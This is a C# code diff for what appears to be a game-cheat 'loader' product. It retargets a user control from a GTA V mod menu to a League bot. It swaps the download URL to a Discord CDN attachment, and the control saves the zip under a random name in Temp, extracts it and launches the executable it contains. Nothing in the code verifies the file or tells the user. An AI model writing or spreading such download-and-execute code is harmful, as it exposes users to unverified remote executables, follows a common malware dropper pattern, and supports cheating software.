@@ -19,9 +19,9 @@ using System.IO.Compression;
 
 namespace Loader.Products
 {
-    public partial class gtaV : UserControl
+    public partial class lolbot1 : UserControl
     {
-        public gtaV()
+        public lolbot1()
         {
             InitializeComponent();
         }
@@ -31,20 +31,20 @@ namespace Loader.Products
 
             try
             {
-                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\GqTsAcXgU.zip");
+                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\PmYvRxEaQw.zip");
                 string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");
 
                 WebClient webClient = new WebClient();
-                webClient.DownloadFileAsync(new Uri("https://tolaplus.xyz/1/GqTsAcXgU.zip"), @download);
+                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/984117119912378368/PmYvRxEaQw.zip"), @download);
 
-                Thread.Sleep(10000);
+                Thread.Sleep(2000);
                 string zipPatch = download;
                 string extractPatch = extractzip;
                 System.IO.Compression.ZipFile.ExtractToDirectory(zipPatch, extractPatch);
 
                 // Construct the path.
                 string temp = Environment.GetEnvironmentVariable("temp");
-                string path = Path.Combine(temp, "1\\modest-menu.exe");
+                string path = Path.Combine(temp, "1\\LeagueBotNet.exe");
                 // Launch the process.
                 Process p = new Process();
                 p.StartInfo.FileName = path;
